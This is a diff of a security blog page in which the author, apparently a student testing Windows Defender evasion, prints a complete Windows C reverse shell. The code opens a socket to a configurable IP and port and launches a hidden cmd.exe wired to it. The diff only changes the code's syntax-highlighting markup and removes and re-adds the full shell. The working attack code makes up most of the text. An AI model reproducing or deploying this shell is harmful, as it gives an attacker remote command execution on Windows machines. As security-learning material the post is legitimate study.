@@ -187,69 +187,68 @@
 
   <p>I had all but given up on open source tools written for this task but I wasn't done yet. My backup plan was <a href="https://blog.sevagas.com/?Bypass-Antivirus-Dynamic-Analysis&recherche=bypass%20antivirus%20dynamic%20analysis" target="_blank" rel="noopener noreferrer">Bypass Antivirus Dynamic Analysis (2014)</a>, an article about coding strategies to bypass AV that a friend had shared with me. The first thing I needed was a simple, not obfuscated reverse shell. I would try each obfuscation technique from the article, and surely one of them would work against Defender. Maybe I fancied myself the lone security student taking on Microsoft.</p>
 
-  <p>The plain shell I started with was: 
-      <pre style="white-space: pre-wrap; word-wrap: break-word;"><code>
-#include &lt;winsock2.h&gt;
-#include &lt;windows.h&gt;
-#include &lt;io.h&gt;
-#include &lt;process.h&gt;
-#include &lt;sys/types.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
+  <p>The plain shell I started with was:</p>
+<pre class="shiki one-dark-pro" style="background-color:#282c34;color:#abb2bf" tabindex="0"><code><span class="line"><span style="color:#C678DD">#include</span><span style="color:#98C379"> &#x3C;winsock2.h></span></span>
+<span class="line"><span style="color:#C678DD">#include</span><span style="color:#98C379"> &#x3C;windows.h></span></span>
+<span class="line"><span style="color:#C678DD">#include</span><span style="color:#98C379"> &#x3C;io.h></span></span>
+<span class="line"><span style="color:#C678DD">#include</span><span style="color:#98C379"> &#x3C;process.h></span></span>
+<span class="line"><span style="color:#C678DD">#include</span><span style="color:#98C379"> &#x3C;sys/types.h></span></span>
+<span class="line"><span style="color:#C678DD">#include</span><span style="color:#98C379"> &#x3C;stdio.h></span></span>
+<span class="line"><span style="color:#C678DD">#include</span><span style="color:#98C379"> &#x3C;stdlib.h></span></span>
+<span class="line"><span style="color:#C678DD">#include</span><span style="color:#98C379"> &#x3C;string.h></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#7F848E;font-style:italic">/* ================================================== */</span></span>
+<span class="line"><span style="color:#7F848E;font-style:italic">/* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */</span></span>
+<span class="line"><span style="color:#7F848E;font-style:italic">/* ================================================== */</span></span>
+<span class="line"><span style="color:#C678DD">#if</span><span style="color:#56B6C2"> !</span><span style="color:#C678DD">defined</span><span style="color:#ABB2BF">(</span><span style="color:#61AFEF">CLIENT_IP</span><span style="color:#ABB2BF">) </span><span style="color:#56B6C2">||</span><span style="color:#56B6C2"> !</span><span style="color:#C678DD">defined</span><span style="color:#ABB2BF">(</span><span style="color:#61AFEF">CLIENT_PORT</span><span style="color:#ABB2BF">)</span></span>
+<span class="line"><span style="color:#C678DD"># define</span><span style="color:#61AFEF"> CLIENT_IP</span><span style="color:#ABB2BF"> (</span><span style="color:#C678DD">char*</span><span style="color:#ABB2BF">)</span><span style="color:#98C379">"0.0.0.0"</span></span>
+<span class="line"><span style="color:#C678DD"># define</span><span style="color:#61AFEF"> CLIENT_PORT</span><span style="color:#ABB2BF"> (</span><span style="color:#C678DD">int</span><span style="color:#ABB2BF">)</span><span style="color:#D19A66">0</span></span>
+<span class="line"><span style="color:#C678DD">#endif</span></span>
+<span class="line"><span style="color:#7F848E;font-style:italic">/* ================================================== */</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C678DD">int</span><span style="color:#61AFEF"> main</span><span style="color:#ABB2BF">(</span><span style="color:#C678DD">void</span><span style="color:#ABB2BF">) {</span></span>
+<span class="line"><span style="color:#C678DD">	if</span><span style="color:#ABB2BF"> (</span><span style="color:#61AFEF">strcmp</span><span style="color:#ABB2BF">(CLIENT_IP, </span><span style="color:#98C379">"0.0.0.0"</span><span style="color:#ABB2BF">) </span><span style="color:#C678DD">==</span><span style="color:#D19A66"> 0</span><span style="color:#56B6C2"> ||</span><span style="color:#ABB2BF"> CLIENT_PORT </span><span style="color:#C678DD">==</span><span style="color:#D19A66"> 0</span><span style="color:#ABB2BF">) {</span></span>
+<span class="line"><span style="color:#61AFEF">		write</span><span style="color:#ABB2BF">(</span><span style="color:#D19A66">2</span><span style="color:#ABB2BF">, </span><span style="color:#98C379">"[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.</span><span style="color:#56B6C2">\n</span><span style="color:#98C379">"</span><span style="color:#ABB2BF">, </span><span style="color:#D19A66">50</span><span style="color:#ABB2BF">);</span></span>
+<span class="line"><span style="color:#C678DD">		return</span><span style="color:#ABB2BF"> (</span><span style="color:#D19A66">1</span><span style="color:#ABB2BF">);</span></span>
+<span class="line"><span style="color:#ABB2BF">	}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ABB2BF">	WSADATA wsaData;</span></span>
+<span class="line"><span style="color:#C678DD">	if</span><span style="color:#ABB2BF"> (</span><span style="color:#61AFEF">WSAStartup</span><span style="color:#ABB2BF">(</span><span style="color:#61AFEF">MAKEWORD</span><span style="color:#ABB2BF">(</span><span style="color:#D19A66">2</span><span style="color:#ABB2BF"> ,</span><span style="color:#D19A66">2</span><span style="color:#ABB2BF">), </span><span style="color:#C678DD">&#x26;</span><span style="color:#ABB2BF">wsaData) </span><span style="color:#C678DD">!=</span><span style="color:#D19A66"> 0</span><span style="color:#ABB2BF">) {</span></span>
+<span class="line"><span style="color:#61AFEF">		write</span><span style="color:#ABB2BF">(</span><span style="color:#D19A66">2</span><span style="color:#ABB2BF">, </span><span style="color:#98C379">"[ERROR] WSASturtup failed.</span><span style="color:#56B6C2">\n</span><span style="color:#98C379">"</span><span style="color:#ABB2BF">, </span><span style="color:#D19A66">27</span><span style="color:#ABB2BF">);</span></span>
+<span class="line"><span style="color:#C678DD">		return</span><span style="color:#ABB2BF"> (</span><span style="color:#D19A66">1</span><span style="color:#ABB2BF">);</span></span>
+<span class="line"><span style="color:#ABB2BF">	}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C678DD">	int</span><span style="color:#ABB2BF"> port </span><span style="color:#C678DD">=</span><span style="color:#ABB2BF"> CLIENT_PORT;</span></span>
+<span class="line"><span style="color:#C678DD">	struct</span><span style="color:#ABB2BF"> sockaddr_in sa;</span></span>
+<span class="line"><span style="color:#ABB2BF">	SOCKET sockt </span><span style="color:#C678DD">=</span><span style="color:#61AFEF"> WSASocketA</span><span style="color:#ABB2BF">(AF_INET, SOCK_STREAM, IPPROTO_TCP, </span><span style="color:#D19A66">NULL</span><span style="color:#ABB2BF">, </span><span style="color:#D19A66">0</span><span style="color:#ABB2BF">, </span><span style="color:#D19A66">0</span><span style="color:#ABB2BF">);</span></span>
+<span class="line"><span style="color:#E5C07B">	sa</span><span style="color:#ABB2BF">.</span><span style="color:#E06C75">sin_family</span><span style="color:#C678DD"> =</span><span style="color:#ABB2BF"> AF_INET;</span></span>
+<span class="line"><span style="color:#E5C07B">	sa</span><span style="color:#ABB2BF">.</span><span style="color:#E06C75">sin_port</span><span style="color:#C678DD"> =</span><span style="color:#61AFEF"> htons</span><span style="color:#ABB2BF">(port);</span></span>
+<span class="line"><span style="color:#E5C07B">	sa</span><span style="color:#ABB2BF">.</span><span style="color:#E5C07B">sin_addr</span><span style="color:#ABB2BF">.</span><span style="color:#E06C75">s_addr</span><span style="color:#C678DD"> =</span><span style="color:#61AFEF"> inet_addr</span><span style="color:#ABB2BF">(CLIENT_IP);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C678DD">#ifdef</span><span style="color:#61AFEF"> WAIT_FOR_CLIENT</span></span>
+<span class="line"><span style="color:#C678DD">	while</span><span style="color:#ABB2BF"> (</span><span style="color:#61AFEF">connect</span><span style="color:#ABB2BF">(sockt, (</span><span style="color:#C678DD">struct</span><span style="color:#ABB2BF"> sockaddr </span><span style="color:#C678DD">*</span><span style="color:#ABB2BF">) </span><span style="color:#C678DD">&#x26;</span><span style="color:#ABB2BF">sa, </span><span style="color:#C678DD">sizeof</span><span style="color:#ABB2BF">(sa)) </span><span style="color:#C678DD">!=</span><span style="color:#D19A66"> 0</span><span style="color:#ABB2BF">) {</span></span>
+<span class="line"><span style="color:#61AFEF">		Sleep</span><span style="color:#ABB2BF">(</span><span style="color:#D19A66">5000</span><span style="color:#ABB2BF">);</span></span>
+<span class="line"><span style="color:#ABB2BF">	}</span></span>
+<span class="line"><span style="color:#C678DD">#else</span></span>
+<span class="line"><span style="color:#C678DD">	if</span><span style="color:#ABB2BF"> (</span><span style="color:#61AFEF">connect</span><span style="color:#ABB2BF">(sockt, (</span><span style="color:#C678DD">struct</span><span style="color:#ABB2BF"> sockaddr </span><span style="color:#C678DD">*</span><span style="color:#ABB2BF">) </span><span style="color:#C678DD">&#x26;</span><span style="color:#ABB2BF">sa, </span><span style="color:#C678DD">sizeof</span><span style="color:#ABB2BF">(sa)) </span><span style="color:#C678DD">!=</span><span style="color:#D19A66"> 0</span><span style="color:#ABB2BF">) {</span></span>
+<span class="line"><span style="color:#61AFEF">		write</span><span style="color:#ABB2BF">(</span><span style="color:#D19A66">2</span><span style="color:#ABB2BF">, </span><span style="color:#98C379">"[ERROR] connect failed.</span><span style="color:#56B6C2">\n</span><span style="color:#98C379">"</span><span style="color:#ABB2BF">, </span><span style="color:#D19A66">24</span><span style="color:#ABB2BF">);</span></span>
+<span class="line"><span style="color:#C678DD">		return</span><span style="color:#ABB2BF"> (</span><span style="color:#D19A66">1</span><span style="color:#ABB2BF">);</span></span>
+<span class="line"><span style="color:#ABB2BF">	}</span></span>
+<span class="line"><span style="color:#C678DD">#endif</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#ABB2BF">	STARTUPINFO sinfo;</span></span>
+<span class="line"><span style="color:#61AFEF">	memset</span><span style="color:#ABB2BF">(</span><span style="color:#C678DD">&#x26;</span><span style="color:#ABB2BF">sinfo, </span><span style="color:#D19A66">0</span><span style="color:#ABB2BF">, </span><span style="color:#C678DD">sizeof</span><span style="color:#ABB2BF">(sinfo));</span></span>
+<span class="line"><span style="color:#E5C07B">	sinfo</span><span style="color:#ABB2BF">.</span><span style="color:#E06C75">cb</span><span style="color:#C678DD"> =</span><span style="color:#C678DD"> sizeof</span><span style="color:#ABB2BF">(sinfo);</span></span>
+<span class="line"><span style="color:#E5C07B">	sinfo</span><span style="color:#ABB2BF">.</span><span style="color:#E06C75">dwFlags</span><span style="color:#C678DD"> =</span><span style="color:#ABB2BF"> (STARTF_USESTDHANDLES);</span></span>
+<span class="line"><span style="color:#E5C07B">	sinfo</span><span style="color:#ABB2BF">.</span><span style="color:#E06C75">hStdInput</span><span style="color:#C678DD"> =</span><span style="color:#ABB2BF"> (HANDLE)sockt;</span></span>
+<span class="line"><span style="color:#E5C07B">	sinfo</span><span style="color:#ABB2BF">.</span><span style="color:#E06C75">hStdOutput</span><span style="color:#C678DD"> =</span><span style="color:#ABB2BF"> (HANDLE)sockt;</span></span>
+<span class="line"><span style="color:#E5C07B">	sinfo</span><span style="color:#ABB2BF">.</span><span style="color:#E06C75">hStdError</span><span style="color:#C678DD"> =</span><span style="color:#ABB2BF"> (HANDLE)sockt;</span></span>
+<span class="line"><span style="color:#ABB2BF">	PROCESS_INFORMATION pinfo;</span></span>
+<span class="line"><span style="color:#61AFEF">	CreateProcessA</span><span style="color:#ABB2BF">(</span><span style="color:#D19A66">NULL</span><span style="color:#ABB2BF">, </span><span style="color:#98C379">"cmd"</span><span style="color:#ABB2BF">, </span><span style="color:#D19A66">NULL</span><span style="color:#ABB2BF">, </span><span style="color:#D19A66">NULL</span><span style="color:#ABB2BF">, </span><span style="color:#D19A66">TRUE</span><span style="color:#ABB2BF">, CREATE_NO_WINDOW, </span><span style="color:#D19A66">NULL</span><span style="color:#ABB2BF">, </span><span style="color:#D19A66">NULL</span><span style="color:#ABB2BF">, </span><span style="color:#C678DD">&#x26;</span><span style="color:#ABB2BF">sinfo, </span><span style="color:#C678DD">&#x26;</span><span style="color:#ABB2BF">pinfo);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#C678DD">	return</span><span style="color:#ABB2BF"> (</span><span style="color:#D19A66">0</span><span style="color:#ABB2BF">);</span></span>
+<span class="line"><span style="color:#ABB2BF">}</span></span></code></pre></body>
 
-/* ================================================== */
-/* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
-/* ================================================== */
-#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
-# define CLIENT_IP (char*)"0.0.0.0"
-# define CLIENT_PORT (int)0
-#endif
-/* ================================================== */
-
-int main(void) {
-	if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
-		write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
-		return (1);
-	}
-
-	WSADATA wsaData;
-	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
-		write(2, "[ERROR] WSASturtup failed.\n", 27);
-		return (1);
-	}
-
-	int port = CLIENT_PORT;
-	struct sockaddr_in sa;
-	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
-	sa.sin_family = AF_INET;
-	sa.sin_port = htons(port);
-	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);
-
-#ifdef WAIT_FOR_CLIENT
-	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
-		Sleep(5000);
-	}
-#else
-	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
-		write(2, "[ERROR] connect failed.\n", 24);
-		return (1);
-	}
-#endif
-
-	STARTUPINFO sinfo;
-	memset(&sinfo, 0, sizeof(sinfo));
-	sinfo.cb = sizeof(sinfo);
-	sinfo.dwFlags = (STARTF_USESTDHANDLES);
-	sinfo.hStdInput = (HANDLE)sockt;
-	sinfo.hStdOutput = (HANDLE)sockt;
-	sinfo.hStdError = (HANDLE)sockt;
-	PROCESS_INFORMATION pinfo;
-	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
-
-	return (0);
-}
-</code></pre></p>
 
   <p>I actually got it from github, I no longer have the link but shoutout to whoever wrote it.</p>
 
